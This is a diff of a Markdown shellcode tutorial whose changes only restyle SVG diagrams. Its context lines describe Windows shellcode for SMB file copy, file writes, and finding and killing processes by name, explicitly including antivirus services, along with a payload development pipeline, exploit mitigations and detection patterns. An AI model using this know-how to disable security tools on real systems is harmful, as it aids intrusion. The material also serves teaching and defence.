 <div align="center"><svg width="750" height="240" viewBox="0 0 750 240" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs><marker id="ah18" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
-<rect width="750" height="240" rx="8" fill="#0a0e17"/>
-<text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">SMB File Copy Sequence</text>
+<defs><linearGradient id="bg_s45" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s45"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s45" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient><marker id="ah18" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
+<rect width="750" height="240" rx="10" fill="url(#bg_s45)"/>
+<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s45)"/>
+<text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s45)">SMB File Copy Sequence</text>
 <rect x="30" y="55" width="155" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
 <text x="107" y="78" text-anchor="middle" fill="#e0e7ff" font-size="11">LoadLibraryA</text>
 <text x="107" y="95" text-anchor="middle" fill="#ff6b35" font-size="10">("mpr.dll")</text>
@@ -2681,8 +2836,10 @@ We need `GENERIC_READ | GENERIC_WRITE` = `0xC0000000`. That value is loaded with
 `0x03` shifted left by 30 bits puts the two set bits at positions 30 and 31 -- exactly `GENERIC_READ | GENERIC_WRITE`.
 
 <div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<rect width="750" height="220" rx="8" fill="#0a0e17"/>
-<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Bit-Shift Access Flag Construction</text>
+<defs><linearGradient id="bg_s46" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s46"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s46" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient></defs>
+<rect width="750" height="220" rx="10" fill="url(#bg_s46)"/>
+<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s46)"/>
+<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold" filter="url(#glow_s46)">Bit-Shift Access Flag Construction</text>
 <!-- Before -->
 <text x="60" y="65" fill="#ff6b35" font-size="12">Before (0x03):</text>
 <rect x="200" y="50" width="500" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
@@ -2722,8 +2879,10 @@ call_closehandle:
 ```
 
 <div align="center"><svg width="750" height="200" viewBox="0 0 750 200" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs><marker id="ah19" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
-<rect width="750" height="200" rx="8" fill="#0a0e17"/>
+<defs><marker id="ah19" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>    <linearGradient id="bg_s211" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s211"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s211" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="200" rx="10" fill="url(#bg_s211)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s211)"/>
 <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">File I/O Sequence</text>
 <rect x="30" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
 <text x="120" y="78" text-anchor="middle" fill="#e0e7ff" font-size="12">CreateFileA</text>
@@ -2761,7 +2920,13 @@ The following video demonstrates the file I/O shellcode creating and writing dat
 Sometimes the goal is not to connect, persist, or download -- it is to **kill a running process**. An attacker might terminate an antivirus service, or a red-team operator might shut down a monitoring agent. This shellcode demonstrates the Toolhelp32 API: enumerate every running process, match a target by name, and terminate it.
 
 <div align="center"><svg viewBox="0 0 750 370" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="370" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s115" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s115"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s115" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="370" rx="10" fill="url(#bg_s115)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s115)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Process Termination Flow</text>
   <!-- Step 1: Snapshot -->
   <rect x="30" y="55" width="190" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
@@ -2802,7 +2967,7 @@ Sometimes the goal is not to connect, persist, or download -- it is to **kill a 
   <!-- Arrow down to TerminateProcess -->
   <line x1="345" y1="305" x2="345" y2="325" stroke="#00ff88" stroke-width="2"/>
   <polygon points="341,322 345,329 349,322" fill="#00ff88"/>
-  <rect x="220" y="325" width="250" height="35" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="220" y="325" width="250" height="35" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="345" y="348" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">5. TerminateProcess(handle, 0)</text>
 </svg></div>
 
@@ -2902,23 +3067,23 @@ set_req_parameters:
   <rect x="40" y="55" width="670" height="40" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
   <text x="375" y="80" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">PROCESSENTRY32 (EDI points here on the stack)</text>
   <!-- Fields -->
-  <rect x="40" y="105" width="120" height="50" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
+  <rect x="40" y="105" width="120" height="50" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
   <text x="100" y="125" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">dwSize</text>
   <text x="100" y="145" text-anchor="middle" fill="#e0e7ff" font-size="9">+0x00 (4B)</text>
-  <rect x="165" y="105" width="100" height="50" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
+  <rect x="165" y="105" width="100" height="50" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
   <text x="215" y="125" text-anchor="middle" fill="#8b949e" font-size="10">cntUsage</text>
   <text x="215" y="145" text-anchor="middle" fill="#8b949e" font-size="9">+0x04 (4B)</text>
-  <rect x="270" y="105" width="140" height="50" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
+  <rect x="270" y="105" width="140" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="340" y="125" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">th32ProcessID</text>
   <text x="340" y="145" text-anchor="middle" fill="#e0e7ff" font-size="9">+0x08 (4B)</text>
-  <rect x="415" y="105" width="100" height="50" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
+  <rect x="415" y="105" width="100" height="50" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
   <text x="465" y="125" text-anchor="middle" fill="#8b949e" font-size="10">...</text>
   <text x="465" y="145" text-anchor="middle" fill="#8b949e" font-size="9">+0x0C-0x20</text>
-  <rect x="520" y="105" width="190" height="50" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
+  <rect x="520" y="105" width="190" height="50" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
   <text x="615" y="125" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">cntThreads</text>
   <text x="615" y="145" text-anchor="middle" fill="#8b949e" font-size="9">+0x20 (4B)</text>
   <!-- szExeFile row -->
-  <rect x="40" y="170" width="670" height="55" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
+  <rect x="40" y="170" width="670" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
   <text x="375" y="193" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">szExeFile[MAX_PATH]</text>
   <text x="375" y="215" text-anchor="middle" fill="#e0e7ff" font-size="11">Offset +0x24  |  260 bytes (MAX_PATH)  |  Process name lives HERE</text>
   <!-- Notes -->
@@ -2987,9 +3152,9 @@ call_terminateprocess:
   <!-- Table header -->
   <rect x="60" y="50" width="120" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
   <text x="120" y="70" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Offset</text>
-  <rect x="185" y="50" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="185" y="50" width="260" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="315" y="70" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Function</text>
-  <rect x="450" y="50" width="240" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="450" y="50" width="240" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="570" y="70" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Hash</text>
   <!-- Rows -->
   <text x="120" y="105" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x04]</text>
@@ -3059,12 +3224,17 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
 **Step 10 -- Iterate.** Fix, reassemble, retest. Each cycle gets faster as your pattern library grows.
 
 <div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs>
-  <marker id="ah20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+  <defs>
+    <linearGradient id="bg_s216" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s216"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s216" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+    <marker id="ah20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
   <marker id="ah20d" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
+  <linearGradient id="bg_s54" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+  <filter id="glow_s54"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+  <linearGradient id="line_s54" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
 </defs>
-<rect width="750" height="440" rx="8" fill="#0a0e17"/>
-<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Shellcode Development Pipeline</text>
+<rect width="750" height="440" rx="10" fill="url(#bg_s54)"/>
+<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s54)"/>
+<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold" filter="url(#glow_s54)">Shellcode Development Pipeline</text>
 <!-- Row 1 -->
 <rect x="30" y="50" width="140" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
 <text x="100" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">1. Identify APIs</text>
@@ -3120,14 +3290,17 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
 
 <div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s217" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s217"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s217" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="ta20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
     <marker id="tb20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
     <marker id="tc20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
+      <linearGradient id="bg_s212" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s212"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s212" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="310" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="310" rx="10" fill="url(#bg_s212)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s212)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Shellcode Development Tooling Ecosystem</text>
   <!-- Center: shellcode.asm -->
-  <rect x="280" y="100" width="190" height="75" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="280" y="100" width="190" height="75" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="375" y="125" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">shellcode.asm</text>
   <text x="375" y="145" text-anchor="middle" fill="#e0e7ff" font-size="10">Your x86 assembly payload</text>
   <text x="375" y="162" text-anchor="middle" fill="#8b949e" font-size="9">The single source of truth</text>
@@ -3184,10 +3357,12 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
 Each layer adds a barrier that shellcode must defeat. Understanding these helps both attackers (for authorized testing) and defenders (for building detections).
 
 <div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<rect width="750" height="360" rx="8" fill="#0a0e17"/>
+  <defs><linearGradient id="bg_s101" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s101"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s101" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient></defs>
+  <rect width="750" height="360" rx="10" fill="url(#bg_s101)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s101)"/>
 <text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Defense-in-Depth: Shellcode Mitigation Layers</text>
 <!-- Layer 4 - CET (outermost) -->
-<rect x="60" y="50" width="630" height="280" rx="10" fill="none" stroke="#ff3366" stroke-width="2.5"/>
+<rect x="60" y="50" width="630" height="280" rx="10" fill="none" stroke="#ff3366" stroke-width="2"/>
 <text x="375" y="72" fill="#ff3366" font-size="13" text-anchor="middle" font-weight="bold">CET (Control-flow Enforcement Technology)</text>
 <text x="375" y="88" fill="#8b949e" font-size="10" text-anchor="middle">Hardware shadow stack catches return-address overwrites</text>
 <!-- Layer 3 - CFG -->
@@ -3199,7 +3374,7 @@ Each layer adds a barrier that shellcode must defeat. Understanding these helps 
 <text x="375" y="165" fill="#00ff88" font-size="13" text-anchor="middle" font-weight="bold">ASLR (Address Space Layout Randomization)</text>
 <text x="375" y="181" fill="#8b949e" font-size="10" text-anchor="middle">Randomizes DLL base addresses -- PEB walk bypasses, but initial redirect must adapt</text>
 <!-- Layer 1 - DEP (innermost) -->
-<rect x="180" y="192" width="390" height="90" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2.5"/>
+<rect x="180" y="192" width="390" height="90" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
 <text x="375" y="218" fill="#00d4ff" font-size="14" text-anchor="middle" font-weight="bold">DEP (Data Execution Prevention)</text>
 <text x="375" y="238" fill="#e0e7ff" font-size="10" text-anchor="middle">Stack/heap marked NX -- need ROP chain to</text>
 <text x="375" y="254" fill="#e0e7ff" font-size="10" text-anchor="middle">VirtualProtect or VirtualAlloc(RWX) first</text>
@@ -3225,7 +3400,13 @@ When you see a suspicious memory region in a forensic dump, you can recognize th
 Understanding the attacker's craft makes you a better defender. Full stop.
 
 <div align="center"><svg viewBox="0 0 750 330" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="330" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s116" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s116"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s116" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="330" rx="10" fill="url(#bg_s116)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s116)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Structural Patterns for Detection</text>
   <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="10">Shellcode fingerprints that defenders can target in signatures and memory scans</text>
   <!-- Pattern 1: PEB access -->
@@ -3346,8 +3527,10 @@ The machine does not care whether instructions come from a `.exe` on disk or fro
       <stop offset="50%" stop-color="#00ff88" stop-opacity="0.8"/>
       <stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/>
     </linearGradient>
+      <linearGradient id="bg_s213" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s213"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s213" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="100" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="100" rx="10" fill="url(#bg_s213)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s213)"/>
   <rect x="75" y="15" width="600" height="1" fill="url(#gline)"/>
   <text x="375" y="52" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">Go build something the CPU has never seen before.</text>
   <rect x="75" y="72" width="600" height="1" fill="url(#gline)"/>
